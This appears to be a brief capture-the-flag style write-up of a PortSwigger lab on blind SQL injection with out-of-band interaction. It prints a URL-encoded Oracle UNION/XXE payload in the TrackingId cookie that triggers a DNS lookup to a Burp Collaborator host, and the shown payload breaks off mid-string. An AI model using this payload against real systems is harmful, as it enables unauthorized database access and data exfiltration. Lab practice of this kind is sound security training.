# Blind SQL injection with out-of-band interaction — (PortSwigger — Practitioner)
**Date:** 2026-08-21
 
---
 
## Vulnerability / core concept
Blind SQL Injection

---


## Payload / key command
This web application uses `TrackingId` which is queried from database. When we injecting basic payloads, we can notice that nothing really happens - neither with error nor time-based attacks. Therefore, we need to test for out-of-band interactions. I tried to use payloads with `;` but they did not work. I guess the program is not allowing stacked queries. Trying payload with `UNION` on the other hand, sent DNS look-up to my Burp Collaborator and solved this lab. This was my URL-encoded payload:
```bash
'%20UNION%20SELECT%20EXTRACTVALUE(xmltype('<?xml%20version%3d"1.0"%20encoding%3d"UTF-8"?><!DOCTYPE%20root%20[%20<!ENTITY%20%25%20remote%20SYSTEM%20"http://z004govg8j3lcb1u7luc2basejka8awz.oastify.com/">%
```


